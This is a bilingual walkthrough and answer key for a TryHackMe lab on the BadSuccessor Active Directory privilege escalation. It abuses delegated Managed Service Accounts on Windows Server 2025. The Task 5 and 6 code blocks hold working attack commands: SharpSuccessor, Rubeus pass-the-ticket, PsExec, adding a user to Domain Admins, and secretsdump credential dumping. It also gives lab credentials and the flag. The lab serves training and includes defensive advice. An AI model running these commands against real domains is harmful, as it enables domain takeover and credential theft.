# AD: BadSuccessor [MEDIUM]

### Información de la Sala / Room Information

* **Dificultad / Difficulty:** MEDIUM
* **Tipo / Type:** Walkthrough
* **Slug:** `adbadsuccessor`
* **Link:** https://tryhackme.com/room/adbadsuccessor
* **Sección / Section:** 02 Level Medium
* **Fuente / Source:** happycamper84 (Medium), t-will-gillis.github.io, thmrevenant/tryhackme (GitHub), Meshky's BlueTeam (GitHub)

## Solucionario de Tareas / Task Solutions

> **ES:** Laboratorio de Active Directory (Premium) que explota el ataque **BadSuccessor**, una escalada de privilegios que abusa de la pertenencia al flujo de migración de cuentas de servicio administradas delegadas (dMSA) introducidas en Windows Server 2025. El objetivo es pasar de un usuario de bajo privilegio a Domain Admin controlando objetos dMSA en una OU con delegación insegura.
> **EN:** A Premium Active Directory lab exploiting the **BadSuccessor** attack, a privilege escalation that abuses the delegated Managed Service Account (dMSA) migration workflow introduced in Windows Server 2025. The goal is to go from a low-privileged user to Domain Admin by controlling dMSA objects in a weakly delegated OU.

### Task 1 - Let's explore the BadSuccessor attack

> **ES:** Presentación del ataque BadSuccessor. Se explica que un usuario con `CreateChild` (o derechos de escritura equivalentes) sobre una OU del dominio puede crear un objeto dMSA y manipular sus atributos (`msDS-ManagedAccountPrecededByLink`, `msDS-DelegatedMSAState`) para suplantar a una cuenta privilegiada, explotando el workflow de migración de cuentas.
> **EN:** Introduction to the BadSuccessor attack. A user with `CreateChild` (or equivalent write rights) on a domain OU can create a dMSA object and manipulate its attributes (`msDS-ManagedAccountPrecededByLink`, `msDS-DelegatedMSAState`) to impersonate a privileged account by abusing the account migration workflow.

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| Continue to the next task | No answer needed |

### Task 2 - Verify your network is working correctly

> **ES:** Conexión RDP a la máquina Windows Server 2025 del lab usando xfreerdp/Remmina con las credenciales facilitadas por la sala.
> **EN:** RDP connection to the lab's Windows Server 2025 machine using xfreerdp/Remmina with the credentials provided by the room.

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| I have confirmed that my network is working correctly | No answer needed |

### Task 3 - Introduction to delegated Managed Service Accounts

> **ES:** Explica la diferencia entre sMSA (Windows Server 2008 R2), gMSA (Windows Server 2012) y dMSA (Windows Server 2025). El dMSA es gestionado por un administrador y permite ejecutar servicios en un servidor concreto; su password se rota automáticamente.
> **EN:** Explains the difference between sMSA (Windows Server 2008 R2), gMSA (Windows Server 2012) and dMSA (Windows Server 2025). A dMSA is admin-managed and allows running services on a specific server; its password rotates automatically.

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| Which version of MS Windows introduced dMSA? | `Windows Server 2025` |

### Task 4 - Identify the vulnerable accounts

> **ES:** Se conecta por RDP como `tbyte` y se copia al escritorio la herramienta de Blue Team de Mishky. Con `Audit-AllOUs` se auditan las OU del dominio y se detectan las cuentas `hmann`, `ditall` y `tbyte` con permisos `CreateChild` (todos los GUID a 0) sobre `ou=LabOU,dc=tryhackme,dc=local`, lo que permite crear dMSAs.
> **EN:** Connect via RDP as `tbyte` and copy Mishky's Blue Team tool to the Desktop. Run `Audit-AllOUs` to audit the domain OUs and detect accounts `hmann`, `ditall` and `tbyte` with `CreateChild` rights (all GUIDs set to 0) on `ou=LabOU,dc=tryhackme,dc=local`, which allows creating dMSAs.

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What is the username of the third account? | `ditall` |

### Task 5 - Exploit the BadSuccessor attack from Windows

> **ES:** Usando `SharpSuccessor.exe` se crea una dMSA armada (`pentest_dmsa`) que suplanta a `Administrator` dentro de la OU vulnerable. Con `Rubeus` se solicitan tickets kerberos (`tgtdeleg`, `asktgs /dmsa`) y se obtiene acceso a `DC-LAB2025-01` vía PsExec. Finalmente se añade `tbyte` al grupo Domain Admins y se lee la flag del escritorio de Administrador.
> **EN:** Using `SharpSuccessor.exe` a weaponized dMSA (`pentest_dmsa`) impersonating `Administrator` is created inside the vulnerable OU. With `Rubeus`, Kerberos tickets are requested (`tgtdeleg`, `asktgs /dmsa`) and access to `DC-LAB2025-01` is obtained via PsExec. Finally `tbyte` is added to the Domain Admins group and the flag is read from the Administrator's Desktop.

```powershell
cd C:\PoC
.\SharpSuccessor.exe add /path:"ou=LabOU,dc=tryhackme,dc=local" /account:tbyte /name:pentest_dmsa /impersonate:Administrator
.\Rubeus.exe tgtdeleg /nowrap
.\Rubeus.exe asktgs /targetuser:pentest_dmsa$ /service:krbtgt/tryhackme.local /opsec /dmsa /nowrap /ptt /ticket:<ticket>
.\Rubeus.exe asktgs /user:pentest_dmsa$ /service:cifs/DC-LAB2025-01.tryhackme.local /opsec /dmsa /nowrap /ptt /ticket:<ticket>
C:\Users\tbyte\Desktop\PSTools\PsExec.exe \\DC-LAB2025-01.tryhackme.local PowerShell
Add-ADGroupMember -Identity "Domain Admins" -Members "tbyte"
Get-Content C:\Users\Administrator\Desktop\flag.txt
```

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What is the flag on the Administrator's Desktop? | `THM{Successors_Unplanned_Upgrade}` |

### Task 6 - I love Linux! (Exploit from Kali)

> **ES:** Repetición del ataque desde Kali Linux usando `bloodyAD` e impacket. Se instala bloodyAD, se añade `DC-LAB2025-01.tryhackme.local` al `/etc/hosts`, se enumeran OU escribibles con `get writable`, se crea y manipula la dMSA, y finalmente se extrae NTDS.dit con `secretsdump.py` o se ingresa por Evil-WinRM.
> **EN:** Repeating the attack from Kali Linux using `bloodyAD` and impacket. Install bloodyAD, add `DC-LAB2025-01.tryhackme.local` to `/etc/hosts`, enumerate writable OUs with `get writable`, create and manipulate the dMSA, and finally dump NTDS.dit with `secretsdump.py` or connect via Evil-WinRM.

```bash
uv tool install - python 3.13 git+https://github.com/CravateRouge/bloodyAD
bloodyAD -d tryhackme.local -u 'tbyte' -p 'P@SSw0rd345' --host DC-LAB2025-01.tryhackme.local get writable -detail
/usr/share/doc/python3-impacket/examples/secretsdump.py tryhackme.local/tbyte:'P@SSw0rd345'@10.211.101.10 > BadSuccessor_NTDS.txt
evil-winrm -i 10.211.101.20 -u tbyte -p 'P@SSw0rd345'
```

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| Continue while following the steps from Kali | No answer needed |

### Task 7 - Further learning

> **ES:** Recomendación de explorar el módulo "Recent Threats" de TryHackMe y otras vulnerabilidades recientes de Active Directory para ampliar conocimientos.
> **EN:** Recommendation to explore TryHackMe's "Recent Threats" module and other recent Active Directory vulnerabilities to broaden knowledge.

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| Continue to further your learning | No answer needed |

## Metodología / Methodology

1. **Paso / Step - Acceso inicial:** Conecta por RDP al Windows Server 2025 con las credenciales del usuario de bajo privilegio `tbyte`.
2. **Paso / Step - Auditar delegación:** Ejecuta el script `Audit-AllOUs` (Blue Team de Mishky) para listar las OU y qué usuarios tienen `CreateChild` con todos los GUID en 0 sobre `ou=LabOU`.
3. **Paso / Step - Identificar objetivo:** Confirma que `tbyte`, `hmann` y `ditall` tienen permisos abusables sobre la OU; la tercera cuenta es `ditall`.
4. **Paso / Step - Crear dMSA armada:** Con `SharpSuccessor.exe add` creas un objeto `pentest_dmsa` que suplanta a `Administrator` y modifica sus atributos de migración.
5. **Paso / Step - Obtener tickets:** Con `Rubeus` (`tgtdeleg`, `asktgs /dmsa /ptt`) materializas la identidad de la dMSA y obtienes un ticket CIFS al DC.
6. **Paso / Step - Ejecución en el DC:** Usas PsExec para ejecutar `Add-ADGroupMember` y añadir `tbyte` a Domain Admins.
7. **Paso / Step - Captura de flag:** Lees `C:\Users\Administrator\Desktop\flag.txt`.
8. **Paso / Step - Post-explotación (Kali):** Repites el flujo con `bloodyAD` y extraes NTDS.dit con `secretsdump.py` para credenciales del dominio.

### Cadena de ataque / Attack Chain

```
tbyte (bajo privilegio)
      │  RDP + Audit-AllOUs
      ▼
OU "LabOU"  (CreateChild con GUIDs a 0)
      │  SharpSuccessor add /impersonate:Administrator
      ▼
dMSA "pentest_dmsa"  (objecto suplantador)
      │  Rubeus tgtdeleg → asktgs /dmsa /ptt
      ▼
Ticket CIFS → DC-LAB2025-01
      │  PsExec
      ▼
Add-ADGroupMember "Domain Admins"  →  flag.txt
```

**Lección:** Una delegación "segura" e incorrectamente configurada (CreateChild/GenericAll con todos los GUID a 0 sobre una OU) convierte a cualquier usuario gestionado por Helpdesk en Domain Admin en cuestión de minutos. La prevención es clave: no delegues `GenericAll`, `WriteOwner`, `WriteDACL` ni `CreateChild` con GUID 0 sobre OUs, y limita la creación de dMSAs a Domain Admins.

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
